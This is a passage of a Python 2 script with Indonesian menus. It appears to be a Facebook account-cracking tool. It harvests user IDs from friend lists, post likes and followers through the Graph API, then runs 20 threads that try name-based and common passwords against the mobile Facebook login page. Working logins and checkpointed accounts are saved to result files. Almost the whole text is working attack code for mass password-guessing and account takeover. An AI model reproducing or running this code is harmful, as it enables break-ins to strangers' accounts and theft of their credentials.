					pb2 = '786786'
					rep = requests.post("https://mbasic.facebook.com/login.php", data = {"email" : ef, "pass" : pb2, "login" : "submit"}, headers = {"user-agent" : "Mozilla/5.0 (Linux; Android 7.1.2; AFTMM Build/NS6265; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/70.0.3538.110 Mobile Safari/537.36"})
					xs = rep.content
					if 'mbasic_logout_button' in xs or 'save-device' in xs:
						print '\033[0;92m[Berhasil]\033[0;97m '+ef+' \033[0;92m∆ \033[0;97m'+pb2
						oke = open('done/pakis.txt', 'a')
						oke.write('\n[Berhasil] '+ef+' ∆ '+pb2)
						oke.close()
						oks.append(ef)
					else:
						if 'checkpoint' in xs:
							print '\033[0;90m[Cekpoint]\033[0;97m '+ef+' \033[0;90m∆\033[0;97m '+pb2
							cek = open('done/pakis.txt', 'a')
							cek.write('\n[Cekpoint] '+ef+' ∆ '+pb2)
							cek.close()
							cekpoint.append(ef)
						else:
							pb3 = p['first_name']+'1234'
							rep = requests.post("https://mbasic.facebook.com/login.php", data = {"email" : ef, "pass" : pb3, "login" : "submit"}, headers = {"user-agent" : "Mozilla/5.0 (Linux; Android 6.0.1; SM-G532G Build/MMB29T) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.83 Mobile Safari/537.36"})
							xs = rep.content
							if 'mbasic_logout_button' in xs or 'save-device' in xs:
								print '\033[0;92m[Berhasil]\033[0;97m '+ef+' \033[0;92m∆ \033[0;97m'+pb3
								oke = open('done/pakis.txt', 'a')
								oke.write('\n[Berhasil] '+ef+' ∆ '+pb3)
								oke.close()
								oks.append(ef)
							else:
								if 'checkpoint' in xs:
									print '\033[0;90m[Cekpoint]\033[0;97m '+ef+' \033[0;90m∆\033[0;97m '+pb3
									cek = open('done/pakis.txt', 'a')
									cek.write('\n[Cekpoint] '+ef+' ∆ '+pb3)
									cek.close()
									cekpoint.append(ef)
								else:
									pb4 = p['first_name']+'12345'
									rep = requests.post("https://mbasic.facebook.com/login.php", data = {"email" : ef, "pass" : pb4, "login" : "submit"}, headers = {"user-agent" : "Mozilla/5.0 (Linux; Android 7.0; SM-G610M Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Mobile Safari/537.36"})
									xs = rep.content
									if 'mbasic_logout_button' in xs or 'save-device' in xs:
										print '\033[0;92m[Berhasil]\033[0;97m '+ef+' \033[0;92m∆ \033[0;97m'+pb4
										oke = open('done/pakis.txt', 'a')
										oke.write('\n[Berhasil] '+ef+' ∆ '+pb4)
										oke.close()
										oks.append(ef)
									else:
										if 'checkpoint' in xs:
											print '\033[0;90m[Cekpoint]\033[0;97m '+ef+' \033[0;90m∆\033[0;97m '+pb4
											cek = open('done/pakis.txt', 'a')
											cek.write('\n[Cekpoint] '+ef+' ∆ '+pb4)
											cek.close()
											cekpoint.append(ef)
										else:
											pb5 = p['first_name']+'123'
											rep = requests.post("https://mbasic.facebook.com/login.php", data = {"email" : ef, "pass" : pb5, "login" : "submit"}, headers = {"user-agent" : "Mozilla/5.0 (Linux; Android 7.1.2; AFTMM Build/NS6265; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/70.0.3538.110 Mobile Safari/537.36"})
											xs = rep.content
											if 'mbasic_logout_button' in xs or 'save-device' in xs:
												print '\033[0;92m[Berhasil]\033[0;97m '+ef+' \033[0;92m∆ \033[0;97m'+pb5
												oke = open('done/pakis.txt', 'a')
												oke.write('\n[Berhasil] '+ef+' ∆ '+pb5)
												oke.close()
												oks.append(ef)
											else:
												if 'checkpoint' in xs:
													print '\033[0;90m[Cekpoint]\033[0;97m '+ef+' \033[0;90m∆\033[0;97m '+pb5
													cek = open('done/pakis.txt', 'a')
													cek.write('\n[Cekpoint] '+ef+' ∆ '+pb5)
													cek.close()
													cekpoint.append(ef)
		except:
			pass
	p = ThreadPool(20)
	p.map(main, id)
	print ("\033[0;93m──────────────────────────────────────────────────────");time.sleep(0.07)
	print '\033[0;91m• \033[0;90mSelesai ...'
	print"\033[0;91m• \033[0;90mTotal \033[0;92mOK\033[0;97m/\x1b[0;90mCP \033[0;97m: \033[0;92m"+str(len(oks))+"\033[0;97m/\033[0;90m"+str(len(cekpoint))
	print '\033[0;91m• \033[0;92mOK\033[0;97m/\x1b[0;90mCP \033[0;90mfile tersimpan \033[0;91m: \033[0;92mdone/pakis.txt'
	print 50* "\033[0;93m─"
	raw_input("\033[0;97m< \033[0;90mKembali\033[0;97m >")
	os.system("python2 crack-2.py")

#### CRACK USA ####
def crack_usa():
	global toket
	os.system('clear')
	try:
		toket=open('login.txt','r').read()
	except IOError:
		print '\033[0;91m! Token Invalid'
		os.system('rm -rf login.txt')
		time.sleep(1)
		keluar()
	os.system('clear')
	print logo
	print ("\033[0;93m──────────────────────────────────────────────────────");time.sleep(0.07)
	print ('\033[0;95m1.\033[0;97m Crack Dari Daftar Teman');time.sleep(0.07)
	print ('\033[0;95m2.\033[0;97m Crack Dari Publik/Teman');time.sleep(0.07)
	print ('\033[0;95m3.\033[0;97m Crack Dari File');time.sleep(0.07)
	print ('\033[0;91m0.\033[0;97m Kembali');time.sleep(0.07)
	print ("\033[0;93m──────────────────────────────────────────────────────");time.sleep(0.07)
	pilih_usa()

### PILIH USA ###
def pilih_usa():
	teak = raw_input('\033[0;95m>\033[0;97m ')
	if teak =="":
		print '\033[0;91m! Isi Yg Benar'
		pilih_usa()
	elif teak =="1":
		os.system('clear')
		print logo
		print ("\033[0;93m──────────────────────────────────────────────────────");time.sleep(0.07)
		r = requests.get("https://graph.facebook.com/me/friends?access_token="+toket)
		z = json.loads(r.text)
		for s in z['data']:
			id.append(s['id'])
	elif teak =="2":
		os.system('clear')
		print logo
		print ("\033[0;93m──────────────────────────────────────────────────────");time.sleep(0.07)
		idt = raw_input("\033[0;91m• \033[0;95mID Publik/Teman \033[0;91m:\033[0;92m ");time.sleep(0.07)
		try:
			pok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
			sp = json.loads(pok.text)
			print "\033[0;91m•\033[0;95m Nama \033[0;91m:\033[0;92m "+sp["name"]
		except KeyError:
			print "\033[0;91m! ID publik/teman tidak ada"
			raw_input("\n\033[1;97m< \033[0;95mKembali \033[0;97m>")
			crack_usa()
		except requests.exceptions.ConnectionError:
			print '\033[0;91m! Tidak ada koneksi'
			keluar()
		r = requests.get("https://graph.facebook.com/"+idt+"/friends?access_token="+toket)
		z = json.loads(r.text)
		for i in z['data']:
			id.append(i['id'])
	elif teak =="3" or teak =="03":
		os.system('clear')
		print logo
		try:
			print ("\033[0;93m──────────────────────────────────────────────────────");time.sleep(0.07)
			idlist = raw_input('\033[0;91m• \033[0;95mNama File\033[0;91m :\033[0;92m ');time.sleep(0.07)
			for line in open(idlist,'r').readlines():
				id.append(line.strip())
		except KeyError:
			print '\033[0;91mFile tidak ada ! '
			raw_input('\033[0;97m<\033[0;95m Kembali\033[0;97m >')
		except IOError:
			print '\033[0;91mFile tidak ada !'
			raw_input("\n\033[0;97m< \033[0;95mKembali \033[0;97m>")
			crack_usa()
	elif teak =="0" or teak =="00":
		crack_teman()
	else:
		print '\033[0;91m! Isi Yg Benar'
		pilih_usa()
	
	print '\033[0;91m• \033[0;95mJumlah ID\033[0;91m :\033[0;92m '+str(len(id));time.sleep(0.07)
	print ('\033[0;91m• \033[0;95mStop Tekan CTRL+Z')
	titik = ['.   ','..  ','... ']
	for o in titik:
		print("\r\033[0;91m• \033[0;95mCrack Berjalan "+o),;sys.stdout.flush();time.sleep(1)
	print ("\n\033[0;91m• \033[0;95mTidak Ada Hasil ? Gunakan Mode Pesawat 1 Detik !");time.sleep(0.07)
	print ("\033[0;93m──────────────────────────────────────────────────────");time.sleep(0.07)
	
### MAIN USA ###
	def main(arg):
		global cekpoint,oks
		em = arg
		try:
			os.mkdir('done')
		except OSError:
			pass
		try:
			an = requests.get('https://graph.facebook.com/'+em+'/?access_token='+toket)
			v = json.loads(an.text)
			px = v['first_name']+'123'
			rex = requests.post("https://mbasic.facebook.com/login.php", data = {"email" : em, "pass" : px, "login" : "submit"}, headers = { "user-agent" : "Mozilla/5.0 (Linux; U; Android 2.2) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1"})
			xo = rex.content
			if 'mbasic_logout_button' in xo or 'save-device' in xo:
				print '\033[0;92m[Berhasil]\033[0;97m '+em+' \033[0;92m∆ \033[0;97m'+px
				oke = open('done/usa.txt', 'a')
				oke.write('\n[Berhasil] '+em+' ∆ '+px)
				oke.close()
				oks.append(em)
			else :
				if 'checkpoint' in xo:
					print '\033[0;95m[Cekpoint]\033[0;97m '+em+' \033[0;95m∆\033[0;97m '+px
					cek = open('done/usa.txt', 'a')
					cek.write('\n[Cekpoint] '+em+' ∆ '+px)
					cek.close()
					cekpoint.append(em)
				else:
					px2 = v['first_name']+'12345'
					rex = requests.post("https://mbasic.facebook.com/login.php", data = {"email" : em, "pass" : px2, "login" : "submit"}, headers = {"user-agent" : "Mozilla/5.0 (Linux; Android 7.1.2; AFTMM Build/NS6265; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/70.0.3538.110 Mobile Safari/537.36"})
					xo = rex.content
					if 'mbasic_logout_button' in xo or 'save-device' in xo:
						print '\033[0;92m[Berhasil]\033[0;97m '+em+' \033[0;92m∆ \033[0;97m'+px2
						oke = open('done/usa.txt', 'a')
						oke.write('\n[Berhasil] '+em+' ∆ '+px2)
						oke.close()
						oks.append(em)
					else:
						if 'checkpoint' in xo:
							print '\033[0;95m[Cekpoint]\033[0;97m '+em+' \033[0;95m∆\033[0;97m '+px2
							cek = open('done/usa.txt', 'a')
							cek.write('\n[Cekpoint] '+em+' ∆ '+px2)
							cek.close()
							cekpoint.append(em)
						else:
							px3 = v['first_name']+'1234'
							rex = requests.post("https://mbasic.facebook.com/login.php", data = {"email" : em, "pass" : px3, "login" : "submit"}, headers = {"user-agent" : "Mozilla/5.0 (Linux; Android 6.0.1; SM-G532G Build/MMB29T) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.83 Mobile Safari/537.36"})
							xo = rex.content
							if 'mbasic_logout_button' in xo or 'save-device' in xo:
								print '\033[0;92m[Berhasil]\033[0;97m '+em+' \033[0;92m∆ \033[0;97m'+px3
								oke = open('done/usa.txt', 'a')
								oke.write('\n[Berhasil] '+em+' ∆ '+px3)
								oke.close()
								oks.append(em)
							else:
								if 'checkpoint' in xo:
									print '\033[0;95m[Cekpoint]\033[0;97m '+em+' \033[0;95m∆\033[0;97m '+px3
									cek = open('done/usa.txt', 'a')
									cek.write('\n[Cekpoint] '+em+' ∆ '+px3)
									cek.close()
									cekpoint.append(em)
								else:
									px4 = '123456'
									rex = requests.post("https://mbasic.facebook.com/login.php", data = {"email" : em, "pass" : px4, "login" : "submit"}, headers = {"user-agent" : "Mozilla/5.0 (Linux; Android 7.0; SM-G610M Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Mobile Safari/537.36"})
									xo = rex.content
									if 'mbasic_logout_button' in xo or 'save-device' in xo:
										print '\033[0;92m[Berhasil]\033[0;97m '+em+' \033[0;92m∆ \033[0;97m'+px4
										oke = open('done/usa.txt', 'a')
										oke.write('\n[Berhasil] '+em+' ∆ '+px4)
										oke.close()
										oks.append(em)
									else:
										if 'checkpoint' in xo:
											print '\033[0;95m[Cekpoint]\033[0;97m '+em+' \033[0;95m∆\033[0;97m '+px4
											cek = open('done/usa.txt', 'a')
											cek.write('\n[Cekpoint] '+em+' ∆ '+px4)
											cek.close()
											cekpoint.append(em)
		except:
			pass
	p = ThreadPool(20)
	p.map(main, id)
	print ("\033[0;93m──────────────────────────────────────────────────────");time.sleep(0.07)
	print '\033[0;91m• \033[0;95mSelesai ...'
	print"\033[0;91m• \033[0;95mTotal \033[0;92mOK\033[0;97m/\x1b[0;95mCP \033[0;97m: \033[0;92m"+str(len(oks))+"\033[0;97m/\033[0;95m"+str(len(cekpoint))
	print '\033[0;91m• \033[0;92mOK\033[0;97m/\x1b[0;95mCP \033[0;95mfile tersimpan \033[0;91m: \033[0;92mdone/usa.txt'
	print 50* "\033[0;93m─"
	raw_input("\033[0;97m< \033[0;95mKembali\033[0;97m >")
	os.system("python2 crack-2.py")
	
### CRACK LIKE ###
def crack_like():
	global toket
	try:
		toket=open('login.txt','r').read()
	except IOError:
		print '\033[0;91m! Token Invalid'
		os.system('rm -rf login.txt')
		time.sleep(1)
		keluar()
	os.system('clear')
	print logo
	print ("\033[0;93m──────────────────────────────────────────────────────");time.sleep(0.07)
	idt = raw_input("\033[0;91m• \033[0;91mID Postingan Publik/Teman \033[0;91m:\033[0;92m ");time.sleep(0.07)
	try:
		r = requests.get("https://graph.facebook.com/"+idt+"/likes?limit=9999999&access_token="+toket)
		z = json.loads(r.text)
		for i in z['data']:
			id.append(i['id'])
	except KeyError:
		print "\033[0;91m! ID postingan salah"
		raw_input("\n\033[1;97m< \033[0;91mKembali \033[0;97m>")
		menu()
	except requests.exceptions.SSLError:
		print '! Koneksi Tidak Ada'
		exit()
		
	print '\033[0;91m• \033[0;91mJumlah ID\033[0;91m :\033[0;92m '+str(len(id));time.sleep(0.07)
	print ('\033[0;91m• \033[0;91mStop Tekan CTRL+Z')
	titik = ['.   ','..  ','... ']
	for o in titik:
		print("\r\033[0;91m• \033[0;91mCrack Berjalan "+o),;sys.stdout.flush();time.sleep(1)
	print ("\n\033[0;91m• \033[0;91mTidak Ada Hasil ? Gunakan Mode Pesawat 1 Detik !");time.sleep(0.07)
	print ("\033[0;93m──────────────────────────────────────────────────────");time.sleep(0.07)
		
### MAIN LIKE ###
	def main(arg):
		global cekpoint,oks
		em = arg
		try:
			os.mkdir('done')
		except OSError:
			pass
		try:
			an = requests.get('https://graph.facebook.com/'+em+'/?access_token='+toket)
			v = json.loads(an.text)
			pc = v['first_name']+'123'
			rex = requests.post("https://mbasic.facebook.com/login.php", data = {"email" : em, "pass" : pc, "login" : "submit"}, headers = { "user-agent" : "Mozilla/5.0 (Linux; U; Android 2.2) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1"})
			xo = rex.content
			if 'mbasic_logout_button' in xo or 'save-device' in xo:
				print '\033[0;92m[Berhasil]\033[0;97m '+em+' \033[0;92m∆ \033[0;97m'+pc
				oke = open('done/like.txt', 'a')
				oke.write('\n[Berhasil] '+em+' ∆ '+pc)
				oke.close()
				oks.append(em)
			else :
				if 'checkpoint' in xo:
					print '\033[0;91m[Cekpoint]\033[0;97m '+em+' \033[0;91m∆\033[0;97m '+pc
					cek = open('done/like.txt', 'a')
					cek.write('\n[Cekpoint] '+em+' ∆ '+pc)
					cek.close()
					cekpoint.append(em)
				else:
					pc2 = v['first_name']+'12345'
					rex = requests.post("https://mbasic.facebook.com/login.php", data = {"email" : em, "pass" : pc2, "login" : "submit"}, headers = {"user-agent" : "Mozilla/5.0 (Linux; Android 7.1.2; AFTMM Build/NS6265; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/70.0.3538.110 Mobile Safari/537.36"})
					xo = rex.content
					if 'mbasic_logout_button' in xo or 'save-device' in xo:
						print '\033[0;92m[Berhasil]\033[0;97m '+em+' \033[0;92m∆ \033[0;97m'+pc2
						oke = open('done/like.txt', 'a')
						oke.write('\n[Berhasil] '+em+' ∆ '+pc2)
						oke.close()
						oks.append(em)
					else:
						if 'checkpoint' in xo:
							print '\033[0;91m[Cekpoint]\033[0;97m '+em+' \033[0;91m∆\033[0;97m '+pc2
							cek = open('done/like.txt', 'a')
							cek.write('\n[Cekpoint] '+em+' ∆ '+pc2)
							cek.close()
							cekpoint.append(em)
						else:
							pc3 = v['first_name']+'1234'
							rex = requests.post("https://mbasic.facebook.com/login.php", data = {"email" : em, "pass" : pc3, "login" : "submit"}, headers = {"user-agent" : "Mozilla/5.0 (Linux; Android 6.0.1; SM-G532G Build/MMB29T) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.83 Mobile Safari/537.36"})
							xo = rex.content
							if 'mbasic_logout_button' in xo or 'save-device' in xo:
								print '\033[0;92m[Berhasil]\033[0;97m '+em+' \033[0;92m∆ \033[0;97m'+pc3
								oke = open('done/like.txt', 'a')
								oke.write('\n[Berhasil] '+em+' ∆ '+pc3)
								oke.close()
								oks.append(em)
							else:
								if 'checkpoint' in xo:
									print '\033[0;91m[Cekpoint]\033[0;97m '+em+' \033[0;91m∆\033[0;97m '+pc3
									cek = open('done/like.txt', 'a')
									cek.write('\n[Cekpoint] '+em+' ∆ '+pc3)
									cek.close()
									cekpoint.append(em)
								else:
									pc4 = v['last_name']+'123'
									rex = requests.post("https://mbasic.facebook.com/login.php", data = {"email" : em, "pass" : pc4, "login" : "submit"}, headers = {"user-agent" : "Mozilla/5.0 (Linux; Android 7.0; SM-G610M Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Mobile Safari/537.36"})
									xo = rex.content
									if 'mbasic_logout_button' in xo or 'save-device' in xo:
										print '\033[0;92m[Berhasil]\033[0;97m '+em+' \033[0;92m∆ \033[0;97m'+pc4
										oke = open('done/like.txt', 'a')
										oke.write('\n[Berhasil] '+em+' ∆ '+pc4)
										oke.close()
										oks.append(em)
									else:
										if 'checkpoint' in xo:
											print '\033[0;91m[Cekpoint]\033[0;97m '+em+' \033[0;91m∆\033[0;97m '+pc4
											cek = open('done/like.txt', 'a')
											cek.write('\n[Cekpoint] '+em+' ∆ '+pc4)
											cek.close()
											cekpoint.append(em)
		except:
			pass
	p = ThreadPool(20)
	p.map(main, id)
	print ("\033[0;93m──────────────────────────────────────────────────────");time.sleep(0.07)
	print '\033[0;91m• \033[0;91mSelesai ...'
	print"\033[0;91m• \033[0;91mTotal \033[0;92mOK\033[0;97m/\x1b[0;91mCP \033[0;97m: \033[0;92m"+str(len(oks))+"\033[0;97m/\033[0;91m"+str(len(cekpoint))
	print '\033[0;91m• \033[0;92mOK\033[0;97m/\x1b[0;91mCP \033[0;91mfile tersimpan \033[0;91m: \033[0;92mdone/like.txt'
	print 50* "\033[0;93m─"
	raw_input("\033[0;97m< \033[0;91mKembali\033[0;97m >")
	os.system("python2 crack-2.py")
	
##### CRACK FOLLOW #####
def crack_follow():
	global toket
	os.system('clear')
	try:
		toket=open('login.txt','r').read()
	except IOError:
		print '\033[0;91m! Token Invalid'
		os.system('rm -rf login.txt')
		time.sleep(1)
		keluar()
	os.system('clear')
	print logo
	print ("\033[0;93m──────────────────────────────────────────────────────");time.sleep(0.07)
	print ('\033[0;93m1.\033[0;97m Crack Dari Follower Saya');time.sleep(0.07)
	print ('\033[0;93m2.\033[0;97m Crack Dari Follower Teman');time.sleep(0.07)
	print ('\033[0;91m0.\033[0;97m Kembali');time.sleep(0.07)
	print ("\033[0;93m──────────────────────────────────────────────────────");time.sleep(0.07)
	pilih_follow()
	
#### PILIH FOLLOW ####
def pilih_follow():
	keak = raw_input('\033[0;93m>\033[0;97m ')
	if keak =="":
		print '\033[0;91m! Isi Yg Benar'
		pilih_follow()
	elif keak =="1":
		os.system('clear')
		print logo
		print ("\033[0;93m──────────────────────────────────────────────────────");time.sleep(0.07)
		r = requests.get("https://graph.facebook.com/me/subscribers?limit=999999&access_token="+toket)
		z = json.loads(r.text)
		for s in z['data']:
			id.append(s['id'])
	elif keak =="2":
		os.system('clear')
		print logo
		print ("\033[0;93m──────────────────────────────────────────────────────");time.sleep(0.07)
		idt = raw_input("\033[0;91m• \033[0;93mID Publik/Teman \033[0;91m:\033[0;92m ");time.sleep(0.07)
		try:
			pok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
			sp = json.loads(pok.text)
			print "\033[0;91m•\033[0;93m Nama \033[0;91m:\033[0;92m "+sp["name"]
		except KeyError:
			print "\033[0;91m! ID publik/teman tidak ada"
			raw_input("\n\033[1;97m< \033[0;93mKembali \033[0;97m>")
			crack_follow()
		except requests.exceptions.ConnectionError:
			print '\033[0;91m! Tidak ada koneksi'
			keluar()
		r = requests.get("https://graph.facebook.com/"+idt+"/subscribers?limit=999999&access_token="+toket)
		z = json.loads(r.text)
		for i in z['data']:
			id.append(i['id'])
	elif keak =="0":
		menu()
	else:
		print '\033[0;91m! Isi Yg Benar'
		pilih_follow()
	
	print '\033[0;91m• \033[0;93mJumlah ID\033[0;91m :\033[0;92m '+str(len(id));time.sleep(0.07)
	print ('\033[0;91m• \033[0;93mStop Tekan CTRL+Z')
	titik = ['.   ','..  ','... ']
	for o in titik:
		print("\r\033[0;91m• \033[0;93mCrack Berjalan "+o),;sys.stdout.flush();time.sleep(1)
	print ("\n\033[0;91m• \033[0;93mTidak Ada Hasil ? Gunakan Mode Pesawat 1 Detik !");time.sleep(0.07)
	print ("\033[0;93m──────────────────────────────────────────────────────");time.sleep(0.07)
	
### MAIN FOLLOW ###
	def main(arg):
		global cekpoint,oks
		em = arg
		try:
			os.mkdir('done')
		except OSError:
			pass
		try:
			an = requests.get('https://graph.facebook.com/'+em+'/?access_token='+toket)
			v = json.loads(an.text)
			pr = v['first_name']+'123'
			rex = requests.post("https://mbasic.facebook.com/login.php", data = {"email" : em, "pass" : pr, "login" : "submit"}, headers = { "user-agent" : "Mozilla/5.0 (Linux; U; Android 2.2) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1"})
			xo = rex.content
			if 'mbasic_logout_button' in xo or 'save-device' in xo:
				print '\033[0;92m[Berhasil]\033[0;97m '+em+' \033[0;92m∆ \033[0;97m'+pr
				oke = open('done/follow.txt', 'a')
				oke.write('\n[Berhasil] '+em+' ∆ '+pr)
				oke.close()
				oks.append(em)
			else :
				if 'checkpoint' in xo:
					print '\033[0;93m[Cekpoint]\033[0;97m '+em+' \033[0;93m∆\033[0;97m '+pr
					cek = open('done/follow.txt', 'a')
					cek.write('\n[Cekpoint] '+em+' ∆ '+pr)
					cek.close()
					cekpoint.append(em)
				else:
					pr2 = v['first_name']+'12345'
					rex = requests.post("https://mbasic.facebook.com/login.php", data = {"email" : em, "pass" : pr2, "login" : "submit"}, headers = {"user-agent" : "Mozilla/5.0 (Linux; Android 7.1.2; AFTMM Build/NS6265; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/70.0.3538.110 Mobile Safari/537.36"})
					xo = rex.content
					if 'mbasic_logout_button' in xo or 'save-device' in xo:
						print '\033[0;92m[Berhasil]\033[0;97m '+em+' \033[0;92m∆ \033[0;97m'+pr2
						oke = open('done/follow.txt', 'a')
						oke.write('\n[Berhasil] '+em+' ∆ '+pr2)
						oke.close()
						oks.append(em)
					else:
						if 'checkpoint' in xo:
							print '\033[0;93m[Cekpoint]\033[0;97m '+em+' \033[0;93m∆\033[0;97m '+pr2
							cek = open('done/follow.txt', 'a')
							cek.write('\n[Cekpoint] '+em+' ∆ '+pr2)
							cek.close()
							cekpoint.append(em)
						else:
							pr3 = v['first_name']+'1234'
							rex = requests.post("https://mbasic.facebook.com/login.php", data = {"email" : em, "pass" : pr3, "login" : "submit"}, headers = {"user-agent" : "Mozilla/5.0 (Linux; Android 6.0.1; SM-G532G Build/MMB29T) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.83 Mobile Safari/537.36"})
							xo = rex.content
							if 'mbasic_logout_button' in xo or 'save-device' in xo:
								print '\033[0;92m[Berhasil]\033[0;97m '+em+' \033[0;92m∆ \033[0;97m'+pr3
								oke = open('done/follow.txt', 'a')
								oke.write('\n[Berhasil] '+em+' ∆ '+pr3)
								oke.close()
								oks.append(em)
							else:
								if 'checkpoint' in xo:
									print '\033[0;93m[Cekpoint]\033[0;97m '+em+' \033[0;93m∆\033[0;97m '+pr3
									cek = open('done/follow.txt', 'a')
									cek.write('\n[Cekpoint] '+em+' ∆ '+pr3)
									cek.close()
									cekpoint.append(em)
								else:
									pr4 = v['first_name']+'321'
									rex = requests.post("https://mbasic.facebook.com/login.php", data = {"email" : em, "pass" : pr4, "login" : "submit"}, headers = {"user-agent" : "Mozilla/5.0 (Linux; Android 7.0; SM-G610M Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Mobile Safari/537.36"})
									xo = rex.content
									if 'mbasic_logout_button' in xo or 'save-device' in xo:
										print '\033[0;92m[Berhasil]\033[0;97m '+em+' \033[0;92m∆ \033[0;97m'+pr4
										oke = open('done/follow.txt', 'a')
										oke.write('\n[Berhasil] '+em+' ∆ '+pr4)
										oke.close()
										oks.append(em)
									else:
										if 'checkpoint' in xo:
											print '\033[0;93m[Cekpoint]\033[0;97m '+em+' \033[0;93m∆\033[0;97m '+pr4
											cek = open('done/follow.txt', 'a')
											cek.write('\n[Cekpoint] '+em+' ∆ '+pr4)
											cek.close()
											cekpoint.append(em)
		except:
			pass
	p = ThreadPool(20)
	p.map(main, id)
	print ("\033[0;93m──────────────────────────────────────────────────────");time.sleep(0.07)
	print '\033[0;91m• \033[0;93mSelesai ...'
	print"\033[0;91m• \033[0;93mTotal \033[0;92mOK\033[0;97m/\x1b[0;93mCP \033[0;97m: \033[0;92m"+str(len(oks))+"\033[0;97m/\033[0;93m"+str(len(cekpoint))
	print '\033[0;91m• \033[0;92mOK\033[0;97m/\x1b[0;93mCP \033[0;93mfile tersimpan \033[0;91m: \033[0;92mdone/follow.txt'
	print 50* "\033[0;93m─"
	raw_input("\033[0;97m< \033[0;93mKembali\033[0;97m >")
	os.system("python2 crack-2.py")
	
#### CARI ID ####
def cari_id():
	os.system('clear')
	print logo
	print ("\033[0;93m──────────────────────────────────────────────────────");time.sleep(0.07)
	ling = ('https://www.facebook.com/')
	url = ling+raw_input("\033[0;91m• \033[0;93mUsername \033[0;91m:\033[0;92m ")
	idre = re.compile('"entity_id":"([0-9]+)"')
	page = requests.get(url)
	nex = idre.findall(page.content)
	for hasil in nex:
		print '\n'+'\033[0;91m• \033[0;93mID Anda\033[0;91m :\033[0;92m '+hasil
		raw_input("\n\033[0;97m< \033[0;92mKembali \033[0;97m>")
		menu()
		
### HASIL CRACK ###
def hasil_crack():
	os.system('clear')
	print logo
	print ("\033[0;93m──────────────────────────────────────────────────────");time.sleep(0.07)
	print ('\033[0;92m1. \033[0;97mLihat Hasil Crack Indonesia');time.sleep(0.07)
	print ('\033[0;92m2. \033[0;97mLihat Hasil Crack Bangladesh');time.sleep(0.07)
	print ('\033[0;92m3. \033[0;97mLihat Hasil Crack Pakistan');time.sleep(0.07)
	print ('\033[0;92m4. \033[0;97mLihat Hasil Crack Usa');time.sleep(0.07)
	print ('\033[0;92m5. \033[0;97mLihat Hasil Crack Like');time.sleep(0.07)
	print ('\033[0;92m6. \033[0;97mLihat Hasil Crack Follow');time.sleep(0.07)
	print ('\033[0;91m0. \033[0;97mKembali');time.sleep(0.07)
	print ("\033[0;93m──────────────────────────────────────────────────────");time.sleep(0.07)
	pilih_hasil()
	
### PILIH HASIL ###
def pilih_hasil():
	keak = raw_input('\033[0;92m>\033[0;97m ')
	if keak =="":
		print '\033[0;91m! Isi Yg Benar'
		pilih_hasil()
	elif keak =="1":
		os.system('xdg-open done/indo.txt')
		hasil_crack()
	elif keak =="2":
		os.system('xdg-open done/bangla.txt')
		hasil_crack()
	elif keak =="3":
		os.system('xdg-open done/bangla.txt')
		hasil_crack()
	elif keak =="4":
		os.system('xdg-open done/pakis.txt')
		hasil_crack()
	elif keak =="5":
		os.system('xdg-open done/usa.txt')
		hasil_crack()
	elif keak =="6":
		os.system('xdg-open done/like.txt')
		hasil_crack()
	elif keak =="7":
		os.system('xdg-open done/follow.txt')
		hasil_crack()
	elif keak =="0":
		menu()
	else:
		print '\033[0;91mIsi Yg Benar'
		
### PERBARUI SCRIPT ###
def perbarui():
	os.system("clear")
	print logo
	print ("\033[0;93m──────────────────────────────────────────────────────");time.sleep(0.07)
	jalan ("\033[0;92mMemperbarui Script ...\033[0;93m")
	os.system("git pull origin master")
	raw_input("\n\033[0;97m<\033[0;92m Kembali \033[0;97m>")
	os.system("python2 crack-2.py")

if __name__=='__main__':
	menu()
	masuk()
